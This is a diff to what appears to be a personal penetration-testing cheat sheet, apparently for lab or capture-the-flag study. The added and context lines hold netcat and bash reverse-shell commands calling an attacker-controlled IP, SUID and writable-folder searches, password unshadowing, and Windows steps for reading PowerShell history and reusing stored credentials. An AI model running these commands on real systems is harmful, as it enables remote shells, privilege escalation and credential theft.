@@ -12,6 +12,8 @@ Payloads all the things: https://github.com/swisskyrepo/PayloadsAllTheThings/blo
 Reverse shell cheatsheet: https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 Sec Lists: https://github.com/danielmiessler/SecLists
 
+nc reverse shell - nc <LOCAL-IP> <PORT> -e /bin/bash
+
 Netscat Shell stabilitisation
 
 1. python -c 'import pty;pty.spawn("/bin/bash")'
@@ -51,6 +53,8 @@ https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
 https://gtfobins.github.io/
 
 find / -type f -perm -04000 -ls 2>/dev/null - will list files that have SUID or SGID bits set
+find / -writable 2>/dev/null - find writable folders
+find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
 
 unshadow passwd.txt shadow.txt > passwords.tx
 openssl passwd -1 -salt <salt> <password> - generate salted hash for a new password
@@ -63,3 +67,9 @@ getcap -r / - list enabled capabilities
 #!/bin/bash
 
 bash -i >& /dev/tcp/10.10.10.10/6666 0>&1
+
+PS commands history (From CMD) - type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+cmdkey /list - stored credentials
+    => runas /savecred /user:<user> cmd.exe - use runas with stored creds
+
+PuTTY proxy details => reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
